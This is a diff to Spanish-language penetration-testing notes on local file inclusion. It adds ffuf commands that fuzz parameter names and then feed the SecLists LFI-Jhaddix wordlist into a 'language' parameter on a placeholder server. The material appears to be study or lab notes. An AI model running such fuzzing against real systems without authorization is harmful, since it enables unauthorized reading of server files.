@@ -131,7 +131,16 @@ Dependiendo de a qué tengamos acceso.
 
 ################################## Automatización:
 
+
+
+
 Podemos buscar parámetros con fuff y luego probar con el intruder de burp la lista "SecLists/Fuzzing/LFI/LFI-Jhaddix.txt"
+Parametros:
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'
+
+valores:
+ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'
+
 
 ###Relative paths:
 
